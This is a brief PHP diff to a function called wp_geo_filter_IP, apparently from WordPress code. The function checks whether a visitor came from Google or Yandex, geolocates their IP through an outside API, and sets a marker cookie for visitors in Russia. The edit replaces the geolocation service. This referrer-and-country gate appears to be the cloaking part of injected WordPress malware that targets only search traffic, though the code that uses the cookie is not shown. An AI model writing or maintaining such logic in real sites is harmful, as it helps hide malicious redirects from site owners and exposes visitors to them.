@@ -40,12 +40,13 @@ function wp_geo_filter_IP() {
     $ref = $_SERVER['HTTP_REFERER'];
     if(strstr($ref, "google.") || strstr($ref, "yandex")) {
         $ip = $_SERVER['REMOTE_ADDR'];
-        $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
+        $ip_data = @json_decode(file_get_contents("https://www.iplocate.io/api/lookup/" . $ip));
 
-        if ($ip_data->geoplugin_countryCode == 'RU') {
+        if ($ip_data->country_code == 'RU') {
             setcookie("xTestCookie", 1, $cookie_expire, "/");
             return true;
         }
+
     }
 
 
